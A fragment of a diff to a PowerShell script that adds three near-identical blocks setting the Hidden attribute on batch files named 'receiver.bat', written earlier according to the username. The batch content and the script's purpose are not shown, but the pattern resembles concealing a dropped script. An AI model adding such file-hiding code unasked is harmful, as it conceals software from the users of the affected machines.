@@ -109,3 +109,36 @@ if ($username.startsWith("27")) {
     Write-Host "Set 3."
     Set-Content -Path $batchFilePath3 -Value $batchContent
 }
+
+try {
+    if (Test-Path $batchFilePath) {
+        Set-ItemProperty -Path $batchFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        Write-Host "Receiver.bat file hidden."
+    } else {
+        Write-Host "Receiver.bat file not found."
+    }
+} catch {
+    Write-Host "Failed to hide receiver.bat: $_"
+}
+
+try {
+    if (Test-Path $batchFilePath2) {
+        Set-ItemProperty -Path $batchFilePath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        Write-Host "Receiver.bat file hidden."
+    } else {
+        Write-Host "Receiver.bat file not found."
+    }
+} catch {
+    Write-Host "Failed to hide receiver.bat: $_"
+}
+
+try {
+    if (Test-Path $batchFilePath3) {
+        Set-ItemProperty -Path $batchFilePath3 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+        Write-Host "Receiver.bat file hidden."
+    } else {
+        Write-Host "Receiver.bat file not found."
+    }
+} catch {
+    Write-Host "Failed to hide receiver.bat: $_"
+}
